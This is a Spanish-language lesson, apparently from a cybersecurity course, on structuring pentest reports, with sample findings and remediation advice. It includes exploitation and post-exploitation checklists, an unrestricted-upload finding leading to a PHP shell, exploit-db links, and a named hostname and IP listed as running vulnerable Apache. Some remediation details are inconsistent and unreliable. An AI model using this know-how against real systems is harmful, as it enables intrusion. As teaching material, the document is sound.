15. Ausencia de fichas (tokens) Anti-CSRF

16. Autenticación

17. Autocomplete

18. Búsqueda Inversa de IP

19. Componentes cliente desactualizados

20. Comprobación de tokens anti-CSRF

21. Configuración de la red de prueba / infraestructura

22. Configuración Incorrecta de CORS / Cross-Origin Resource Sharing

23. Confusión de Ruta Relative

24. Contenido HTTPS Disponible vía HTTP

25. Content Security Policy (CSP) Header Not SeT

26. Contraseña de texto claro

27. Cookie No HttpOnly Flag

28. Cross Site Scripting

29. Cross-Domain JavaScript Source File Inclusion

30. Definición de Roles

31. Descarga de documentos sin sesión válida

32. Desconfiguración de Dominio Cruzado / Control de acceso HTTP

33. Detección y fortaleza del Firewall

34. Divulgación de información - Directivas inseguras de PHP

35. DIVULGACIÓN DE INFORMACIÓN - Manejo de errores inapropiados

36. DIVULGACIÓN DE INFORMACIÓN - mediante ''X-Powered-By''

37. Divulgación de información - Mensajes de error de depuración

38. Divulgación de la marca de hora - Unix

39. Divulgación de Proxy

40. Divulgación de versión IIS y .NET

41. Entrada de usuario o login

42. Esquema de autorización de omisión

43. Esquema de gestión de sesión

44. Fuga de información

45. HSTS Missing From HTTPS Server (RFC 6797)

46. HTTP TRACE Methods Allowed

47. Información General

48. Inyección NoSQL - MongoDB

49. Inyección Remota de Comandos del Sistema Operativo

50. Inyección XSLT

51. Listado de directorios

52. Mapas del sitio web

53. Missing Anti-clickjacking Header

54. Path Traversal

55. Permissions Policy Header Not Set

56. PHP múltiples vulnerabilidades

57. Política de Usuario débil o no forzada

58. Private IP Disclosure

59. Redirecciones no controladas

60. Reunión de la Información Reconocimiento en Motores de Búsqueda

61. Saltando 403

62. Secure Pages Include Mixed Content

63. Server-side template injection

64. SQL Injection

65. SSL/TLS, SSLv2 y SSLv3 detección

66. Strict-Transport-Security Header Not Set

67. SUB RESOURCE INTEGRITY ATTRIBUTE MISSING

68. Unauthenticated Blind SSRF via DNS Rebinding

69. Uploading de archivos sin restricción

70. Variables de sesión expuestas

71. WordPress, Temas Y Plugins Desactualizados

72. X-Content-Type-Options Header Missing

### Explotación

La fase de explotación consiste en realizar todas aquellas acciones que puedan comprometer al sistema auditado, a los usuarios o a la información que maneja. Principalmente se comprueba que no se puedan realizar ataques tipo:

- Inyección de código
- Inclusión de ficheros locales o remotos
- Evasión de autenticación
- Carencia de controles de autorización
- Ejecución de comandos en el lado del servidor
- Ataques tipo Cross Site Request Forgery
- Control de errores
- Gestión de sesiones
- Fugas de información
- Secuestros de sesión
- Comprobación de las condiciones para realizar una denegación de servicio
- Carga de ficheros maliciosos

<aside>
👉 Estos tipos de ataques se realizan adaptando el desarrollo de cada ataque, técnicas en uso y las últimas tecnologías disponibles.

</aside>

### **Post explotación**

En caso de encontrarse una vulnerabilidad que permita realizar otras acciones en el sistema auditado o en su entorno, se realizarán controles adicionales con el objetivo de comprobar la criticidad de esta. En función de las posibilidades que permita una vulnerabilidad concreta, se intentarán realizar las siguientes acciones de post-explotación:

- Obtención de información confidencial
- Evasión de mecanismos de autenticación
- Realizar acciones del lado de los usuarios
- Realizar acciones o ejecutar comandos en el servidor que aloja la aplicación
- Privilegios disponibles en el servidor (si se consigue acceso al mismo)
- Otros sistemas o servicios accesibles desde la aplicación comprometida
- Realizar acciones sin el consentimiento del usuario

<aside>
📖 La posibilidad de encadenar varias vulnerabilidades para conseguir un acceso de mayor nivel o para evadir los controles de seguridad también serán escenarios valorados a la hora de realizar el análisis de riesgos. Utilizamos varias metodologías, pero nos vamos a centrar en OWASP TOP 10 – 2021.
</aside>

Una organización sin ánimo de lucro a nivel mundial dedicada a mejorar la seguridad de las aplicaciones y del software en general.

[https://owasp.org/Top10/es/](https://owasp.org/Top10/es/)

## Calificación global del riesgo

Habiendo considerado los resultados potenciales y los niveles de riesgo evaluados para cada actividad de prueba documentada, Hackware considera que la exposición global al riesgo con respecto a los intentos de actores maliciosos de violar y controlar los recursos dentro de su entorno de información es ALTO (según lo determinado utilizando la Clasificación del riesgo Puntuación CVSSv3).

[https://www.incibe-cert.es/blog/cvss3-0](https://www.incibe-cert.es/blog/cvss3-0)

La tabla que figura a continuación proporciona una clave para la denominación de los riesgos y los colores utilizados a lo largo de este informe para ofrecer un sistema de puntuación de riesgos claro y conciso.

Cabe señalar que la cuantificación del riesgo empresarial global planteado por cualquiera de los problemas detectados en las pruebas queda fuera de nuestro alcance. Esto significa que algunos riesgos pueden considerarse elevados desde un punto de vista técnico, pero, como resultado de otros controles que desconocemos, pueden ser críticos o no desde un punto de vista empresarial.

| Risk Rating | CVSSv3 Score | Descripción |
| --- | --- | --- |
| CRITICAL | 9.0 – 10 | Se ha descubierto una vulnerabilidad crítica. Es necesario resolverla lo antes posible. |
| HIGH | 7.0 – 8.9 | Se ha descubierto una vulnerabilidad alta. Esto requiere una resolución a corto plazo. |
| MEDIUM | 4.0 – 6.9 | Se ha descubierto una vulnerabilidad media.Debe resolverse a lo largo del proceso de mantenimiento. |
| LOW | 0.1 – 3.9 | Se ha descubierto una vulnerabilidad baja. Esto debe abordarse como parte de las tareas de mantenimiento rutinario. |
| INFO | 0 | Se ha producido un descubrimiento que se notifica a título informativo. Debe abordarse para cumplir con las prácticas líderes. |
- Pruebas realizadas, descubrimientos y pruebas de concepto. (lo veremos en más profundidad)
- Conclusiones y recomendaciones. (lo veremos en más profundidad)

En la introducción y contexto del documento, se describen detalles sobre la auditoría a realizar y su alcance, algo que evidentemente también se debe de encontrar reflejado en el acuerdo firmado con el cliente. Esta parte del documento pretende informar al lector sobre cuáles son las pruebas que se han realizado sin entrar en demasiados detalles, a modo de resumen ejecutivo.

Otro detalle importante que es necesario tener en cuenta en cualquier informe, es la sección correspondiente a las metodologías utilizadas, las cuales en todo caso dependerán de la auditoría a realizar. Es altamente recomendable implementar metodologías que ya han sido depuradas y tengan una buena aceptación por parte de la industria. Por ejemplo, algunas metodologías interesantes se listan a continuación, aunque evidentemente aplican en función del tipo de auditoría realizada:

- Penetration Testing Execution Standard (PTES)
- PCI (Payment Card Industry) Penetration testing guide
- Open Source Security Testing Methodology Manual (OSSTMM)
- OWASP Top 10
- OWASP Testing Guide
- OWASP Mobile Top 10
- OWASP API Top 10

El contenido propiamente dicho del documento debe de incluir las pruebas que se han realizado, explicando cada una de las etapas de la auditoría, herramientas y técnicas utilizadas, así como los resultados de cada una. Se trata de una sección en donde es importante incluir los detalles de la forma más clara y concisa, evitando redundancias y bloques de código o salidas de log demasiado extensas con el fin de favorecer la legibilidad del documento. En el caso de que sea necesario incluir dichos elementos, sería recomendable abordarlos en anexos independientes para que el lector los pueda revisar por separado. En este punto, probablemente lo más importante es que la información aporte valor. Es decir, no sirve de nada incluir cada una de las pruebas de concepto que se han ejecutado si no han producido los resultados esperados. Solo se debe incluir información relevante y de interés para el objeto de la auditoría. De nada sirve dedicar 2 o 3 páginas del informe explicando que se ha lanzado un exploit para el Apache (por poner un ejemplo) si dicho exploit no ha funcionado debido a que probablemente el servicio no es vulnerable. Incluye solo información que aporte valor.

Finalmente, en la sección de recomendaciones viene bien incluir algunos puntos a tener en cuenta para mejorar la seguridad del sistema auditado, aunque también se pueden resaltar aquellas configuraciones y/o buenas prácticas que se están llevando a cabo con el fin de que el cliente siga haciendo uso de ellas y alentar a su mantenimiento. Si se encuentran vulnerabilidades es muy importante incluir contramedidas o recomendaciones que sean útiles para mitigarlas o mecanismos de protección que ayuden a solucionar los problemas detectados. Ojo, el hecho de incluir esas contramedidas no es vinculante y no significa que seas tú quien las va a implementar. Te han contratado para ejecutar una auditoría y detectar problemas, implementar las soluciones es algo que debe valorar el cliente.

## **Tipo de auditoría**

Se pueden crear diferentes tipos de informes dependiendo de las necesidades del cliente, las cuales han tenido que quedar reflejadas en el acuerdo. Es posible que la auditoría a realizar se centre en uno de los siguientes escenarios:

- Pentesting perimetral/externo.
- Pentesting interno.
- Pentesting wireless

Dependiendo de cada caso hay que tener en cuenta factores adicionales que deben quedar reflejados en el documento, por ejemplo cuando un cliente pide un enfoque mixto y una parte de la auditoría será externa y otra parte interna.

## **Informe técnico e Informe ejecutivo**

Con todo lo anterior claro, lo primero que hay que tener en cuenta es que no todos los clientes son iguales y en algunos casos es necesario desarrollar 2 o más informes que reflejen las tareas realizadas. Es importante adaptarse y entender el público objetivo. Es decir, si la persona que va a leer el informe es personal técnico le interesará que esté orientado a describir las vulnerabilidades, defectos y recomendaciones que aporta el documento. En este caso será revisado por una persona que como mínimo, tiene unos conocimientos básicos y entenderá lo que cuentas pero si por ejemplo, ese mismo documento lo lee un directivo, responsable de área o personal no técnico, evidentemente lo más probable es que entienda poco o nada. Imagina por un instante que un experto en finanzas (por poner un ejemplo) te pasa un informe técnico de una auditoría financiera, crees que tendrás el criterio suficiente para decir si eso que te han enviado está «bien» o «mal»? probablemente pasarás de leerlo y se lo enviarás a alguien que sea experto en el tema. Dependiendo del alcance y lo que se haya hablado con el cliente es probable que tengas que elaborar un informe orientado al personal técnico y otro a «decision makers» o directivos/responsables, en cada caso el lenguaje que utilizas y el mensaje que transmites debe ser lo suficientemente claro para el lector objetivo.

## **Las plantillas no hacen un buen informe.**

Puedes usar plantillas disponibles en Internet o las que a lo mejor se encuentran disponibles en la empresa en la que trabajas, por supuesto que es algo perfectamente valido pero no deja de ser una base que te ayuda a ahorrar tiempo en definir un diseño y «maquetar» secciones. Puedes (y debes) adaptar la plantilla a la auditoría que estás realizando, no es algo estático que debes seguir a rajatabla. Si te hace falta añadir, quitar o mover secciones lo haces y ya está. Que la plantilla que utilices no se convierta en un problema, se ha creado precisamente para que puedas hacer el trabajo más rápido.

# **Elaboración de informes claros y concisos**

## **Cómo Redactar un Informe de Pentesting con Éxito**

1.  Planificación en la Redacción: Evita dejar la redacción del informe para el último momento. Documenta hallazgos durante la auditoría y elimina información innecesaria para evitar un informe extenso pero carente de valor.
2. Revisión por Pares: La redacción es un arte. Pide a un colega que lea el informe antes de entregarlo. La claridad para ti puede no ser igual para los demás. Obtener una segunda opinión ayuda a detectar errores y mejorar la comprensión del mensaje.
3. Facilita la Lectura con Elementos Visuales: Incorpora capturas de pantalla para ilustrar puntos clave. Mantén la calidad sobre la cantidad; la concisión es clave. Evita detalles irrelevantes y enfócate en la información esencial.
4. Niveles de Criticidad: Asigna niveles de gravedad a cada vulnerabilidad según el modelo de CVS. Destaca la urgencia de solucionar problemas críticos y distingue aquellos menos preocupantes.
5. Buenas Prácticas en la Redacción: Atiende a detalles ortográficos para una presentación profesional. Incluye información de contacto, horarios y canales de comunicación. Consulta con el cliente antes de sugerir actualizaciones en servicios desactualizados.
6. Recomendaciones Prácticas: En las capturas, preserva la privacidad evitando información sensible. Adjunta PoCs y exploits en anexos. Usa enlaces para conceptos técnicos. Facilita recomendaciones en formato de "checklist" y proporciona referencias e instrucciones adicionales.
7. Evita Excesos y Opiniones Personales: Ajusta la cantidad de capturas para evitar excesos. Sé neutral; evita opiniones personales. Mantén un equilibrio para que el informe no parezca un álbum de fotos, sino un documento de calidad.
8.  Historial de Eventos: Incluye un historial con cambios de alcance, organizativos, disposición de sistemas y eventos relevantes. Proporciona un contexto cronológico que mejore la comprensión del proceso de auditoría.
9. Herramientas y Plantillas Útiles: Utiliza plantillas de PurpleSec, Pentest-hub, TCM Security, Offensive Security y TGB Security. Explora la herramienta PWNDoc para una gestión eficiente de informes.

# **Comunicación de las vulnerabilidades encontradas y recomendaciones de mitigación**

Ejemplos de Vulnerabilidades encontradas, pruebas, consecuencias y recomendaciones de mitigación.

## Nivel alto - ausencia de fichas (tokens) anti-csrf

No se encontraron fichas (tokens) Anti-CSRF en formularios HTML. Esto permite una solicitud falsa entre sitios en un ataque que compromete y obliga a una víctima a enviar su solicitud HTTP a un destino objetivo sin su conocimiento o intención para poder realizar una acción como si fuera el usuario legitimo. La causa es la funcionalidad oculta de la aplicación utilizando acciones de URL/formulario que pueden ser adivinados de forma repetible.

![tokens](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/tokens.png?raw=true)

La naturaleza del ataque es que CSRG explota la confianza que un sitio web proporciona a un usuario. Por el contrario, las cadenas de comandos de los sitios cruzados (XSS) explotan la confianza que un usuario proporciona en un sitio web.

Al igual que XSS, los ataques CSRG no tienen por qué ser de sitios cruzados, pero hay la posibilidad de que puedan serlo. La falsificación de las solicitudes ente los sitios también se conoce como CSRF, XSRG y ataques con un solo clic. Los ataques de CSRG son muy efectivos en varias situaciones, que incluyen:

- La victima tiene una sesión activa en el sitio de destino.
- La víctima se autoriza por medio de la autenticación HTTP en el sitio de destino.
- La víctima se encuentra en la misma red local que el sitio de destino.

CSRF se ha utilizado especialmente para poder realizar una acción contra un sitio objetivo utilizando los privilegios de la víctima, pero se han revelado técnicas recientes para difundir información al obtener el acceso a la respuesta.

El riesgo de divulgación de información aumenta de forma drástica cuando el sitio de destino se encuentra vulnerable a XSS, porque XSS se puede utilizar como una plataforma para CSRF, lo que le permite al atacante que opere desde adentro de los límites de la misma política de origen.

## **Consecuencias**

Cuando se lleva a cabo con éxito, un ataque CSRF puede tener una amplia variedad de repercusiones, según los privilegios de la víctima. Si el objetivo es un usuario estándar, es probable que toda su cuenta se vea comprometida, desde su información personal hasta sus privilegios en el sitio.

Y eso no es nada comparado con el impacto de un ataque CSRF en la cuenta de un administrador: podría paralizar todo el sitio. Dada la magnitud de un posible ataque CSRF, es esencial que cualquier paquete de seguridad web pueda proteger contra él.

![csrf](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/csrf.png?raw=true)

El objetivo más común de un ataque CSRF es el robo de datos, identidad o dinero. Estos son algunos de los usos más comunes de CSRF:

- **Puede comprometer todo el sistema de administración de contenido**: Puede agregar o eliminar contenido en un sitio web. Si la víctima es el administrador, el atacante toma el control de todo el sitio.
- **Cambiar la contraseña de un usuario:** Si la víctima ha iniciado sesión en su cuenta, el atacante puede falsificar una solicitud para cambiar su correo electrónico. Después de eso, puede falsificar una solicitud de restablecimiento de contraseña y tomar el control total de la cuenta de la víctima.
- **Agregar artículos al carrito de un usuario o cambiar la dirección de entrega de un pedido:** En el caso de un ataque CSRF, el atacante puede modificar esta información. En el sitio web, la víctima aparece como autora de estas modificaciones.

## **Solución**

Utiliza una biblioteca o marco comprobado que no acepte que ocurra esta debilidad o que proporcione construcciones que permitan que esta debilidad sea más sencilla de evitar. Por ejemplo, utiliza el paquete anti-CSRG como el CSRGuard de OWASP.

Asegúrate de que su aplicación esté libre de fallas de secuencias de comandos entre sitios, ya que la mayoría de las defensas de CSRF pueden detenerse por medio del uso de secuencias de comandos manejadas por el atacante.

Origina un nonce único para cada uno de los formularios, colócalo en el formulario y confirme la independencia al obtener el formulario. Asegúrate de que el nonce no sea predecible (CWE-330). Debes tener en cuenta que esto puede pasar desapercibido utilizando XSS.

Identificar las operaciones que sean especialmente peligrosas. Cuando el usuario desarrolla una operación peligrosa, envíe una solicitud de confirmación de forma separada para poder garantizar que el usuario tenga la intención de desarrollar esa operación.

Utiliza el control de gestión de la sesión de ESAPI. Este control introduce un elemento para CSRF y no utilice el método GET para ninguna de las solicitudes que puedan desencadenar un cambio de estado. Revisa que la solicitud se creó en la página esperada.

Un token anti-CSRF es un valor oculto que se envía con las cookies y la solicitud del usuario en particular. Así es como funciona:

- El servidor web genera este token y se coloca como un campo oculto en el formulario.
- Cuando el usuario completa y envía el formulario, el token se incluye en la solicitud POST.
- El servidor comparará el token generado y el token enviado por el usuario.

Si coincide, la solicitud será válida. Si no coincide, la solicitud se considera inválida. Esto evita que se produzcan ataques CSRF.

**O mediante plugins:** Headers Security Advanced & HSTS WP

[https://wordpress.org/plugins/headers-security-advanced-hsts-wp/](https://wordpress.org/plugins/headers-security-advanced-hsts-wp/)

![hsts](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/csrf.png?raw=true)

## Evidencias

![evidencia y referencias](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/evidencias.png?raw=true)

## Referencias:

- [https://wordpress.org/plugins/headers-security-advanced-hsts-wp](https://wordpress.org/plugins/headers-security-advanced-hsts-wp)
- [https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html](https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control.html)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4](https://owasp.org/www-project-web-security-testing-guide/v42/4)-
- Web_Application_Security_Testing/06-Session_Management_Testing/05- Testing_for_Cross_Site_Request_Forgery
- [http://projects.webappsec.org/Cross-Site-Request-Forgery](http://projects.webappsec.org/Cross-Site-Request-Forgery)
- [http://cwe.mitre.org/data/definitions/352.html](http://cwe.mitre.org/data/definitions/352.html)
- [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- **[https://kinsta.com/es/base-de-conocimiento/hsts-missing-from-https-server/](https://kinsta.com/es/base-de-conocimiento/hsts-missing-from-https-server/)**

## **Ejemplo:**

NIVEL MEDIO - SSL/TLS usa algoritmos hashing y cifrado débiles

SSL (Secure Sockets Layer) y TLS (Transport Layer Security) son protocolos de seguridad utilizados para cifrar y proteger las comunicaciones en línea entre un cliente (como un navegador web) y un servidor. Estos protocolos garantizan la confidencialidad y la integridad de los datos transmitidos a través de Internet.

Los algoritmos de hash y cifrado son componentes esenciales de SSL/TLS, pero si se utilizan algoritmos débiles, la seguridad de las comunicaciones puede estar comprometida.

![SSL](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/ssl.png?raw=true)

- **Algoritmos de Hash**: Los algoritmos de hash son funciones matemáticas que convierten un conjunto de datos en una cadena de caracteres de longitud fija. Se utilizan para generar resúmenes únicos (hashes) de los datos, que luego se pueden comparar para verificar la integridad de los datos.

- **Algoritmos de Cifrado**: Los algoritmos de cifrado son utilizados por SSL/TLS para cifrar los datos transmitidos, de modo que solo el destinatario legítimo pueda descifrarlos. Estos algoritmos aseguran la confidencialidad de la información.

- **Consecuencias de Hashing Débil**: Si se utilizan algoritmos de hash débiles, un atacante podría calcular fácilmente colisiones (dos conjuntos diferentes de datos que generan el mismo hash), lo que comprometería la integridad de la comunicación. Esto podría llevar a la manipulación de datos en tránsito sin ser detectado.

- **Manipulación de Datos**: Un atacante podría modificar los datos en tránsito sin ser detectado, ya que podría generar un nuevo conjunto de datos que produzca el mismo hash que el conjunto original.

- **Integridad Comprometida**: Las verificaciones de integridad se vuelven ineficaces, ya que los hashes no garantizan que los datos no hayan sido alterados.

- **Consecuencias de Cifrado Débil**: Si se utilizan algoritmos de cifrado débiles, la información podría ser descifrada fácilmente por atacantes, lo que expondría los datos sensibles a la interceptación y el robo.

- **Intercepción de Datos**: Atacantes pueden descifrar y robar información confidencial, como contraseñas y datos financieros.

- **Exposición a Ataques**: Algoritmos de cifrado débiles pueden ser vulnerables a ataques de fuerza bruta y otros métodos de criptoanálisis.

## Solución

Para garantizar una conexión segura con SSL/TLS, es importante:

1. Utilizar Algoritmos Fuertes: Se deben usar algoritmos de hash y cifrado robustos y actualizados que sean resistentes a los ataques actuales y futuros.
2. Actualizar Versiones: Utilizar las versiones más recientes de SSL/TLS, ya que implementan mejoras de seguridad y retiran el soporte a algoritmos obsoletos.
3. Configurar Ajustes de Seguridad: Configurar adecuadamente los ajustes de seguridad en el servidor para deshabilitar algoritmos débiles y priorizar aquellos más seguros.
4. Evaluar y Monitorear Regularmente: Realizar evaluaciones de seguridad periódicas para identificar posibles debilidades y mantenerse informado sobre las últimas amenazas y soluciones.

La elección de algoritmos de hash y cifrado sólidos es fundamental para asegurar que las comunicaciones a través de SSL/TLS sean seguras y confiables.

### **Solucion de Hashing Débil**:

- Utilizar Algoritmos Fuertes: Implementar algoritmos de hash robustos y resistentes a colisiones, como SHA-256 o superior, que sean menos susceptibles a ataques.
- Actualizar Software: Mantener actualizado el software y las bibliotecas de criptografía para asegurarse de que estén utilizando las últimas y más seguras implementaciones de algoritmos de hash.

**Consecuencias de Cifrado Débil:**

- Priorizar Algoritmos Fuertes: Configurar los servidores para priorizar el uso de algoritmos de cifrado seguros y resistente, como AES en modo Galois/Counter Mode (AES-GCM) o ChaCha20-Poly1305.
- Desactivar Algoritmos Débiles: Eliminar del conjunto de algoritmos permitidos aquellos que sean considerados débiles o inseguros.
- Actualizar Protocolos: Utilizar versiones actualizadas de TLS, como TLS 1.3, que han eliminado algoritmos de cifrado obsoletos y débiles.

> Evidencia y Referencias

![report](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/report.png?raw=true)

- [https://www.schneier.com/paper-ssl.pdf](https://www.schneier.com/paper-ssl.pdf)
- [http://www.phreedom.org/research/rogue-ca](http://www.phreedom.org/research/rogue-ca)
- [http://www.microsoft.com/technet/security/advisory/961509.mspx](http://www.microsoft.com/technet/security/advisory/961509.mspx)
- [http://www.kb.cert.org/vuls/id/836068](http://www.kb.cert.org/vuls/id/836068)
- [http://tools.ietf.org/html/rfc3279](http://tools.ietf.org/html/rfc3279)
- [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770833(v=ws.11)](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770833(v=ws.11))
- [https://technet.microsoft.com/en-us/library/ff458357.aspx](https://technet.microsoft.com/en-us/library/ff458357.aspx)
- [https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/](https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/)
- [https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001)](https://www.owasp.org/index.php/Testing_for_Weak_SSL/TLS_Ciphers,_Insufficient_Transport_Layer_Protection_(OTG-CRYPST-001))
- [https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/](https://www.acunetix.com/blog/articles/tls-ssl-cipher-hardening/)

## **Ejemplo 3:**

Uploading de archivos sin restricción

A través de funcionalidades de la aplicación es posible subir archivos a los servidores de la organización. Es posible subir cualquier tipo de archivo ya que los mismos no son controlados. De esta manera es posible tomar control completo del servidor a través de la subida de una Shell PHP.

**Dispositivos o sistemas afectados**

![descargas](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/descargas.png?raw=true)

![php](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/php.png?raw=true)

## **Recomendaciones y enlaces de referencia**

Se recomienda controlar los tipos de archivos subidos a la plataforma y solo permitir archivos predeterminados, como PDF/DOC/XLS, controlando el tipo de archivo a través de su *MIME Type*. Controlar el tipo de archivo por extensión no es suficiente.

En PHP se debe utilizar la función *fileinfo()* para controlar el tipo de archivo subido.

**Más información**

- [https://www.owasp.org/index.php/Unrestricted_File_Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload)
- [https://www.owasp.org/index.php/Protect_FileUpload_Against_Malicious_File](https://www.owasp.org/index.php/Protect_FileUpload_Against_Malicious_File)
- [https://stackoverflow.com/questions/11601342/upload-doc-or-pdf-using-php](https://stackoverflow.com/questions/11601342/upload-doc-or-pdf-using-php)
- [http://php.net/fileinfo](http://php.net/fileinfo)

## **Ejemplo 4:**

PHP múltiples vulnerabilidades

Se ha detectado que uno de los servidores utiliza PHP con versiones que ya no son soportadas, que tienen múltiples vulnerabilidades conocidas y públicas que permiten tomar el control del servidor web y realizar ataques de Denegación de Servicio (DoS).

Adicionalmente, la rama 5.3.x ya no es soportada por el fabricante.

**Dispositivos o sistemas afectados**

- PHP 7.0.7
- Versiones soportadas: 7.1.x / 7.0.x

![Versiones soportadas:](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/versiones-soportadas.png?raw=true)

Algunas de estas vulnerabilidades tienen *exploits* disponibles que pueden ser aprovechados a través de herramientas como *CoreImpact o Metaexploit*.

**Recomendaciones y enlaces de referencia**

Se recomienda instalar la última actualización de PHP (5.3.29 o superior) de forma inmediata y proceder a la migración a una versión soportada (5.6.x o superior, y 7.1.x o superior).

**Más información**

- [http://www.php.net/releases/5_3_7.php](http://www.php.net/releases/5_3_7.php)
- [http://php.net/eol.php](http://php.net/eol.php)
- [https://www.exploit-db.com/exploits/29290](https://www.exploit-db.com/exploits/29290)
- [https://www.exploit-db.com/exploits/18836](https://www.exploit-db.com/exploits/18836)
- [https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-90936/PHP-PHP-5.3.2.html](https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-90936/PHP-PHP-5.3.2.html)
- [http://blog.kotowicz.net/2011/06/file-path-injection-in-php-536-file.html](http://blog.kotowicz.net/2011/06/file-path-injection-in-php-536-file.html)

## **Ejemplo 5:**

Apache no soportado

Se ha detectado que uno de los servidores utiliza Apache 2.0.x y 2.2.x, el cual tiene múltiples vulnerabilidades conocidas y públicas que permiten tomar el control del servidor web y/o realizar ataques de DoS.

### **Dispositivos o sistemas afectados**

- imss.institutoseguro.com.ar
- Versión instalada: Apache 2.2.15 (Linux/SUSE)
- Fin de soporte: 2017-07-11 (2.2.34)
- Anuncio: [http://archive.apache.org/dist/httpd/Announcement2.2.html](http://archive.apache.org/dist/httpd/Announcement2.2.html)
- Versiones soportadas: Apache 2.4.x

![Apache Linux](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/apache-linux.png?raw=true)

- 200.45.107.99
- Versión instalada: Apache 2.0.50
- Anuncio: [http://archive.apache.org/dist/httpd/Announcement2.0.html](http://archive.apache.org/dist/httpd/Announcement2.0.html)
- Versiones soportadas: Apache 2.4.x

Estas versiones tienen vulnerabilidades conocidas con exploits disponibles que puede ser aprovechados a través de herramientas como CoreImpact o Metaexploit.

### **Recomendaciones y enlaces de referencia**

Se recomienda instalar la última esta actualización de Apache (2.0.59 y 2.2.34 o superior) de forma inmediata y proceder a la migración a una versión soportada (2.4.38 o superior).

**Más información**

- [http://archive.apache.org/dist/httpd/Announcement2.2.html](http://archive.apache.org/dist/httpd/Announcement2.2.html)
- [https://github.com/apache/httpd/releases](https://github.com/apache/httpd/releases)

## **Ejemplo 6:**

Directivas inseguras de PHP

En las distintas instalaciones de PHP se han encontrado errores de configuración.

**PHPinfo habilitado**

Se encontró un archivo que ejecuta la función *phpinfo()*, encarga de brindar información del servidor.

**Aplicaciones afectadas**

![server-adr](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/server-adr.png?raw=true)

![allow_url_fopen](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/allow_url_fopen.png?raw=true)

> PHP allow_url_fopen habilitado

La directiva de configuración de PHP *“allow_url_fopen”* está habilitada por defecto. Cuando está habilitada, esta directiva permite la recuperación de datos desde ubicaciones remotas (sitio web o servidor FTP). Un gran número de vulnerabilidades de inyección de código reportadas en aplicaciones web basadas en PHP son causadas por la combinación de habilitación de *“allow_url_fopen”* y un mal filtrado de entrada.

**PHP open_basedir no especificado**

La directiva de configuración *“open_basedir”* permite limitar los archivos que PHP puede abrir al árbol de directorios especificado. Cuando un script intenta abrir un archivo con, por ejemplo, *fopen()* o *gzopen()*, se comprueba la ubicación del archivo. Cuando el archivo está fuera del árbol de directorios especificado, PHP rechazará abrirlo. *“open_basedir”* es una buena protección contra las vulnerabilidades de inclusión remota de archivos.

**Directorio PHPMyAdmin encontrado**

Se encuentra un directorio *“phpmyadmin”* habilitado que finalmente impacta contra una dirección IP interna de la organización: [https://192.168.3.21/phpMyAdmin/](https://192.168.3.21/phpMyAdmin/)

### **Aplicaciones afectadas**

![register_globals](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/register_globals.png?raw=true)

- **PHP register_globals habilitado**

Cuando *“register_globals”* está habilitado, PHP creará automáticamente variables en el ámbito global para cualquier valor pasado en GET, POST o COOKIE. Esto, combinado con el uso de variables sin inicialización, puede llevar a numerosas vulnerabilidades de seguridad.

- **PHP display_errors habilitado**

La directiva *“display_errors”* determina si se deben enviar mensajes de error al navegador. Con frecuencia, estos mensajes contienen información confidencial sobre el entorno de su aplicación web y nunca deben presentarse a fuentes que no sean de confianza.

- **PHP session.use_only_cookies desactivado**

Cuando *“use_only_cookies”* está deshabilitado, PHP pasará el ID de sesión a través de la URL. Esto hace que la aplicación sea más vulnerable a los ataques de secuestro de sesión. El secuestro de la sesión es básicamente una forma de robo de identidad en la que un atacante se hace pasar por un usuario legítimo al robar su ID de sesión. Cuando el *token* de sesión se transmite en una *cookie* y la solicitud se realiza en un canal seguro (se utiliza SSL/TLS), este *token* es seguro.

### **Recomendaciones y enlaces de referencia**

Se debe deshabilitar la directiva de PHP “allow_url_fopen” desde php.ini.

Habilitar un directorio base a través de la directiva *“open_basedir”* desde *php.ini.*

Eliminar cualquier archivo que brinde información sobre el servidor y las aplicaciones instaladas (*phpinfo*, *test*, *phpmyadmin*, etc).

Desactivar *“register_globals”* desde *php.ini* o *.htaccess*.

Desactivar *“display_errors”* desde *php.ini* o *.htaccess*.

Activar *“session.use_only_cookies”* desde *php.ini* o *.htaccess.*

**Más información:**

- [http://php.net/manual/en/filesystem.configuration.php](http://php.net/manual/en/filesystem.configuration.php)
- [http://www.php.net/manual/en/security.globals.php](http://www.php.net/manual/en/security.globals.php)
- [http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting](http://www.php.net/manual/en/errorfunc.configuration.php#ini.error-reporting)
- [http://php.net/ini.core](http://php.net/ini.core)
- [http://www.php.net/session.configuration](http://www.php.net/session.configuration)
- [http://www.php.net/manual/en/function.phpinfo.php](http://www.php.net/manual/en/function.phpinfo.php)

**Hemos concluido con el estudio de esta semana. Happy Hacking!!**